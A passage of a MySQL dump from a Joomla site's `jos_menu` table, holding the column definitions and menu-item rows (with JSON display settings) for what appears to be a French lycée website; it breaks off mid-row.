  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL COMMENT 'The SEF alias of the menu item.',
  `note` varchar(255) NOT NULL DEFAULT '',
  `path` varchar(1024) NOT NULL COMMENT 'The computed path of the menu item based on the alias field.',
  `link` varchar(1024) NOT NULL COMMENT 'The actually link the menu item refers to.',
  `type` varchar(16) NOT NULL COMMENT 'The type of link: Component, URL, Alias, Separator',
  `published` tinyint(4) NOT NULL DEFAULT '0' COMMENT 'The published state of the menu link.',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '1' COMMENT 'The parent menu item in the menu tree.',
  `level` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'The relative level in the tree.',
  `component_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to #__extensions.id',
  `ordering` int(11) NOT NULL DEFAULT '0' COMMENT 'The relative ordering of the menu item in the tree.',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to #__users.id',
  `checked_out_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT 'The time the menu item was checked out.',
  `browserNav` tinyint(4) NOT NULL DEFAULT '0' COMMENT 'The click behaviour of the link.',
  `access` int(10) unsigned DEFAULT NULL,
  `img` varchar(255) NOT NULL COMMENT 'The image of the menu item.',
  `template_style_id` int(10) unsigned NOT NULL DEFAULT '0',
  `params` text NOT NULL COMMENT 'JSON encoded data for the menu item.',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `home` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Indicates if this menu item is the home or default page.',
  `language` char(7) NOT NULL DEFAULT '',
  `client_id` tinyint(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_client_id_parent_id_alias_language` (`client_id`,`parent_id`,`alias`,`language`),
  KEY `idx_componentid` (`component_id`,`menutype`,`published`,`access`),
  KEY `idx_menutype` (`menutype`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`),
  KEY `idx_path` (`path`(333)),
  KEY `idx_language` (`language`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=143 ;

--
-- Dumping data for table `jos_menu`
--

INSERT INTO `jos_menu` (`id`, `menutype`, `title`, `alias`, `note`, `path`, `link`, `type`, `published`, `parent_id`, `level`, `component_id`, `ordering`, `checked_out`, `checked_out_time`, `browserNav`, `access`, `img`, `template_style_id`, `params`, `lft`, `rgt`, `home`, `language`, `client_id`) VALUES
(1, '', 'Menu_Item_Root', 'root', '', '', '', '', 1, 0, 0, 0, 0, 0, '0000-00-00 00:00:00', 0, 0, '', 0, '', 0, 123, 0, '*', 0),
(2, 'menu', 'com_banners', 'Banners', '', 'Banners', 'index.php?option=com_banners', 'component', 0, 1, 1, 4, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners', 0, '', 1, 10, 0, '*', 1),
(3, 'menu', 'com_banners', 'Banners', '', 'Banners/Banners', 'index.php?option=com_banners', 'component', 0, 2, 2, 4, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners', 0, '', 2, 3, 0, '*', 1),
(4, 'menu', 'com_banners_categories', 'Categories', '', 'Banners/Categories', 'index.php?option=com_categories&extension=com_banners', 'component', 0, 2, 2, 6, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners-cat', 0, '', 4, 5, 0, '*', 1),
(5, 'menu', 'com_banners_clients', 'Clients', '', 'Banners/Clients', 'index.php?option=com_banners&view=clients', 'component', 0, 2, 2, 4, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners-clients', 0, '', 6, 7, 0, '*', 1),
(6, 'menu', 'com_banners_tracks', 'Tracks', '', 'Banners/Tracks', 'index.php?option=com_banners&view=tracks', 'component', 0, 2, 2, 4, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners-tracks', 0, '', 8, 9, 0, '*', 1),
(7, 'menu', 'com_contact', 'Contacts', '', 'Contacts', 'index.php?option=com_contact', 'component', 0, 1, 1, 8, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:contact', 0, '', 11, 16, 0, '*', 1),
(8, 'menu', 'com_contact', 'Contacts', '', 'Contacts/Contacts', 'index.php?option=com_contact', 'component', 0, 7, 2, 8, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:contact', 0, '', 12, 13, 0, '*', 1),
(9, 'menu', 'com_contact_categories', 'Categories', '', 'Contacts/Categories', 'index.php?option=com_categories&extension=com_contact', 'component', 0, 7, 2, 6, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:contact-cat', 0, '', 14, 15, 0, '*', 1),
(10, 'menu', 'com_messages', 'Messaging', '', 'Messaging', 'index.php?option=com_messages', 'component', 0, 1, 1, 15, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:messages', 0, '', 17, 22, 0, '*', 1),
(11, 'menu', 'com_messages_add', 'New Private Message', '', 'Messaging/New Private Message', 'index.php?option=com_messages&task=message.add', 'component', 0, 10, 2, 15, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:messages-add', 0, '', 18, 19, 0, '*', 1),
(12, 'menu', 'com_messages_read', 'Read Private Message', '', 'Messaging/Read Private Message', 'index.php?option=com_messages', 'component', 0, 10, 2, 15, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:messages-read', 0, '', 20, 21, 0, '*', 1),
(13, 'menu', 'com_newsfeeds', 'News Feeds', '', 'News Feeds', 'index.php?option=com_newsfeeds', 'component', 0, 1, 1, 17, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:newsfeeds', 0, '', 23, 28, 0, '*', 1),
(14, 'menu', 'com_newsfeeds_feeds', 'Feeds', '', 'News Feeds/Feeds', 'index.php?option=com_newsfeeds', 'component', 0, 13, 2, 17, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:newsfeeds', 0, '', 24, 25, 0, '*', 1),
(15, 'menu', 'com_newsfeeds_categories', 'Categories', '', 'News Feeds/Categories', 'index.php?option=com_categories&extension=com_newsfeeds', 'component', 0, 13, 2, 6, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:newsfeeds-cat', 0, '', 26, 27, 0, '*', 1),
(16, 'menu', 'com_redirect', 'Redirect', '', 'Redirect', 'index.php?option=com_redirect', 'component', 0, 1, 1, 24, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:redirect', 0, '', 37, 38, 0, '*', 1),
(17, 'menu', 'com_search', 'Search', '', 'Search', 'index.php?option=com_search', 'component', 0, 1, 1, 19, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:search', 0, '', 29, 30, 0, '*', 1),
(18, 'menu', 'com_weblinks', 'Weblinks', '', 'Weblinks', 'index.php?option=com_weblinks', 'component', 0, 1, 1, 21, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:weblinks', 0, '', 31, 36, 0, '*', 1),
(19, 'menu', 'com_weblinks_links', 'Links', '', 'Weblinks/Links', 'index.php?option=com_weblinks', 'component', 0, 18, 2, 21, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:weblinks', 0, '', 32, 33, 0, '*', 1),
(20, 'menu', 'com_weblinks_categories', 'Categories', '', 'Weblinks/Categories', 'index.php?option=com_categories&extension=com_weblinks', 'component', 0, 18, 2, 6, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:weblinks-cat', 0, '', 34, 35, 0, '*', 1),
(101, 'mainmenu', 'accueil', 'accueil', '', 'accueil', 'index.php?option=com_content&view=featured', 'component', 1, 1, 1, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 7, '{"featured_categories":["17","18","19"],"layout_type":"blog","num_leading_articles":"0","num_intro_articles":"3","num_columns":"3","num_links":"0","multi_column_order":"1","orderby_pri":"","orderby_sec":"front","order_date":"","show_pagination":"2","show_pagination_results":"1","show_title":"0","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"1","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 39, 40, 1, '*', 0),
(102, 'mainmenu', 'intranet', 'intranet', '', 'intranet', '#', 'url', 0, 1, 1, 0, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 95, 106, 0, '*', 0),
(103, 'mainmenu', 'formations', 'formations', '', 'formations', 'index.php?option=com_content&view=category&layout=blog&id=18', 'component', 1, 1, 1, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"front","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 63, 74, 0, '*', 0),
(104, 'mainmenu', 'lycée', 'lycee', '', 'lycee', 'index.php?option=com_content&view=category&layout=blog&id=17', 'component', 1, 1, 1, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"0","num_intro_articles":"4","num_columns":"1","num_links":"0","multi_column_order":"1","show_subcategory_content":"","orderby_pri":"","orderby_sec":"front","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 45, 62, 0, '*', 0),
(106, 'mainmenu', 'contact', 'contact', '', 'contact', 'index.php?option=com_contact&view=contact&id=1', 'component', 1, 1, 1, 8, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"presentation_style":"plain","show_contact_category":"","show_contact_list":"","show_name":"","show_position":"","show_email":"","show_street_address":"","show_suburb":"","show_state":"","show_postcode":"","show_country":"","show_telephone":"","show_mobile":"","show_fax":"","show_webpage":"","show_misc":"","show_image":"","allow_vcard":"","show_articles":"","show_links":"","linka_name":"","linkb_name":"","linkc_name":"","linkd_name":"","linke_name":"","show_email_form":"","show_email_copy":"","banned_email":"","banned_subject":"","banned_text":"","validate_session":"","custom_reply":"","redirect":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 107, 110, 0, '*', 0),
(111, 'mainmenu', 'messagerie', 'nunc-quis-est-id-nisi', '', 'intranet/nunc-quis-est-id-nisi', 'http://www.lms.ens-cachan.fr/gw/webacc', 'url', 0, 102, 2, 0, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 96, 97, 0, '*', 0),
(112, 'mainmenu', 'netsorage', 'ut-at-lorem-ante', '', 'intranet/ut-at-lorem-ante', 'http://server.lms.ens-cachan.fr/netstorage/', 'url', 0, 102, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 98, 101, 0, '*', 0),
(113, 'mainmenu', 'vie-scolaire.net', 'aliquam-consequat', '', 'intranet/aliquam-consequat', 'https://www.viescolaire.net/accueil_0.aspx', 'url', -2, 102, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 102, 103, 0, '*', 0),
(115, 'main', 'COM_AKEEBA', 'com-akeeba', '', 'com-akeeba', 'index.php?option=com_akeeba', 'component', 0, 1, 1, 10006, 0, 0, '0000-00-00 00:00:00', 0, 1, '../media/com_akeeba/icons/akeeba-16.png', 0, '', 119, 120, 0, '', 1),
(129, 'mainmenu', 'Personnel', 'lycee-personnel', '', 'lycee/lycee-personnel', 'index.php?option=com_content&view=category&layout=blog&id=28', 'component', 1, 104, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 56, 57, 0, '*', 0),
(130, 'mainmenu', 'Accès - Horaires', 'lycee-acces-horaires', '', 'lycee/lycee-acces-horaires', 'index.php?option=com_content&view=article&id=63', 'component', 1, 104, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 58, 59, 0, '*', 0),
(114, 'mainmenu', 'vie scolaise', 'suspendisse-adipiscing', 'https://www.viescolaire.net/accueil_0.aspx', 'intranet/ut-at-lorem-ante/suspendisse-adipiscing', '', 'url', -2, 112, 3, 0, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 99, 100, 0, '*', 0),
(21, 'menu', 'com_finder', 'Smart Search', '', 'Smart Search', 'index.php?option=com_finder', 'component', 0, 1, 1, 27, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:finder', 0, '', 43, 44, 0, '*', 1),
(22, 'menu', 'com_joomlaupdate', 'Joomla! Update', '', 'Joomla! Update', 'index.php?option=com_joomlaupdate', 'component', 0, 1, 1, 28, 0, 0, '0000-00-00 00:00:00', 0, 0, 'class:joomlaupdate', 0, '', 41, 42, 0, '*', 1),
(118, 'mainmenu', 'Support', '2013-10-08-17-30-54', '', 'intranet/2013-10-08-17-30-54', 'support', 'url', -2, 102, 2, 0, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 104, 105, 0, '*', 0),
(119, 'mainmenu', 'Actualités', 'actualites', '', 'actualites', 'index.php?option=com_content&view=category&layout=blog&id=19', 'component', 1, 1, 1, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"0","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"0","num_intro_articles":"4","num_columns":"2","num_links":"0","multi_column_order":"","show_subcategory_content":"-1","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 91, 94, 0, '*', 0),
(120, 'mainmenu', 'Équipe de direction', '2014-01-05-23-35-32', '', 'lycee/2014-01-05-23-35-32', '/equipe-direction', 'url', -2, 104, 2, 0, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 48, 49, 0, '*', 0),
(121, 'mainmenu', 'Centre de documentation', 'vie-scol-cdi', '', 'vie-scolaire/vie-scol-cdi', 'index.php?option=com_content&view=category&layout=blog&id=31', 'component', 1, 133, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 82, 83, 0, '*', 0),
(122, 'mainmenu', 'Équipe de direction (2)', '2014-01-05-23-35-33', '', 'lycee/2014-01-05-23-35-33', '/equipe-direction', 'url', -2, 104, 2, 0, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 50, 51, 0, '*', 0),
(123, 'mainmenu', 'Les personnels', '2014-01-05-23-52-31', '', 'lycee/2014-01-05-23-52-31', '55-personnels', 'url', -2, 104, 2, 0, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 54, 55, 0, '*', 0),
(124, 'mainmenu', 'Notre force, nos résultats', '2014-01-05-23-54-47', '', 'lycee/2014-01-05-23-54-47', '56-resultats', 'url', -2, 104, 2, 0, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 52, 53, 0, '*', 0),
(125, 'mainmenu', 'jyjyf', 'loremipsum', '', 'contact/loremipsum', 'index.php?option=com_content&view=categories&id=0', 'component', 1, 106, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"show_base_description":"","categories_description":"","maxLevelcat":"-1","show_empty_categories_cat":"1","show_subcat_desc_cat":"","show_cat_num_articles_cat":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","num_leading_articles":"1","num_intro_articles":"4","num_columns":"2","num_links":"4","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_pagination_limit":"","filter_field":"","show_headings":"","list_show_date":"","date_format":"","list_show_hits":"","list_show_author":"","display_num":"10","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 108, 109, 0, '*', 0),
(126, 'mainmenu', 'Pré-bac', 'form-pre-bac', '', 'formations/form-pre-bac', 'index.php?option=com_content&view=category&layout=blog&id=23', 'component', 1, 103, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 64, 65, 0, '*', 0),
(127, 'mainmenu', 'Poster un article', 'actualites-poster', '', 'actualites/actualites-poster', 'index.php?option=com_content&view=form&layout=edit', 'component', -2, 119, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"enable_category":"1","catid":"19","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 92, 93, 0, '*', 0),
(131, 'mainmenu', 'BTS', 'form-bts', '', 'formations/form-bts', 'index.php?option=com_content&view=category&layout=blog&id=24', 'component', 1, 103, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 66, 67, 0, '*', 0),
(128, 'mainmenu', 'Histoire', 'lycee-histoire', '', 'lycee/lycee-histoire', 'index.php?option=com_content&view=category&layout=blog&id=22', 'component', 1, 104, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 46, 47, 0, '*', 0),
(132, 'mainmenu', 'Classes Préparatoires', 'form-cpge', '', 'formations/form-cpge', 'index.php?option=com_content&view=category&layout=blog&id=25', 'component', 1, 103, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 68, 69, 0, '*', 0),
(133, 'mainmenu', 'Vie scolaire', 'vie-scolaire', '', 'vie-scolaire', 'index.php?option=com_content&view=category&layout=blog&id=29', 'component', 1, 1, 1, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"0","num_intro_articles":"4","num_columns":"2","num_links":"0","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 75, 90, 0, '*', 0),
(134, 'mainmenu', 'Associations Sportives', 'vie-scol-asso-sportive', '', 'vie-scolaire/vie-scol-asso-sportive', 'index.php?option=com_content&view=category&layout=blog&id=30', 'component', 1, 133, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 84, 